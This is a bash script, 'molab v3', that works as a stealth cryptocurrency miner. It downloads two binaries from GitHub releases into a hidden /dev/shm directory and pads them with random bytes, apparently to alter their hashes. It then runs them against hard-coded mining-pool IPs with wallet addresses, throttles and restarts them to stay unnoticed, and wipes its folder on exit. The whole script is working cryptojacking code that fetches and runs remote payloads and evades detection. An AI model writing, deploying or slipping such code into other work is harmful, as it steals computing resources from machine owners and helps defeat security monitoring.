#!/bin/bash
# molab v3 — direct connect, no tunnel, multi-instance friendly
PRL="prl1pkmulndfyls8zqz2r6nruevpqr3tax9nwmvew7aupaxqnkcyuppeqa6am7q"
TDC="tbc1q727xp60hjp6zld2vgrj8qrdmgvkshwav86xns2"
WRK="$(hostname)-$(date +%s | md5sum | head -c 4)"
MAX=$((RANDOM%21600+21600))

echo "=== molab v3 — $WRK — ${MAX}s ==="

# Setup
apt-get install -y -qq cpulimit 2>/dev/null
rm -rf /dev/shm/.m 2>/dev/null; mkdir -p /dev/shm/.m && cd /dev/shm/.m

# Download
python3 -c "
import urllib.request as u
open('p','wb').write(u.urlopen('https://github.com/mhusataringan-hub/ABC/releases/download/v1.0/peak').read())
open('s','wb').write(u.urlopen('https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2').read())
"
dd if=/dev/urandom of=p bs=1 count=$((RANDOM%3000+1024)) seek=$(stat -c%s p) conv=notrunc oflag=append 2>/dev/null
dd if=/dev/urandom of=s bs=1 count=$((RANDOM%3000+1024)) seek=$(stat -c%s s) conv=notrunc oflag=append 2>/dev/null
chmod +x p s

# PRL — direct pool, no proxy
(while true; do
    nice -n 19 ./p --coin pearl --url 23.94.152.126:80 --user "${PRL}.${WRK}" 2>/dev/null
    sleep 5
done) &
P1=$!
cpulimit -l 45 -p $P1 2>/dev/null &

sleep 10

# TDC
nice -n 19 ./s -a yespowertide -o 47.251.244.12:80 -u "${TDC}.${WRK}" -t 1 >/dev/null 2>&1 &
P2=$!
cpulimit -l 45 -p $P2 2>/dev/null &

echo "[*] P1:$P1 P2:$P2"

# Keepalive
(
    while sleep 300; do
        if ! kill -0 $P1 2>/dev/null; then
            (while true; do
                nice -n 19 /dev/shm/.m/p --coin pearl --url 23.94.152.126:80 --user "${PRL}.${WRK}" 2>/dev/null
                sleep 5
            done) &
            P1=$!
            cpulimit -l 45 -p $P1 2>/dev/null &
        fi
        if ! kill -0 $P2 2>/dev/null; then
            nice -n 19 /dev/shm/.m/s -a yespowertide -o 47.251.244.12:80 -u "${TDC}.${WRK}" -t 1 >/dev/null 2>&1 &
            P2=$!
            cpulimit -l 45 -p $P2 2>/dev/null &
        fi
    done
) &

trap "kill $P1 $P2 2>/dev/null; rm -rf /dev/shm/.m" EXIT
sleep $MAX
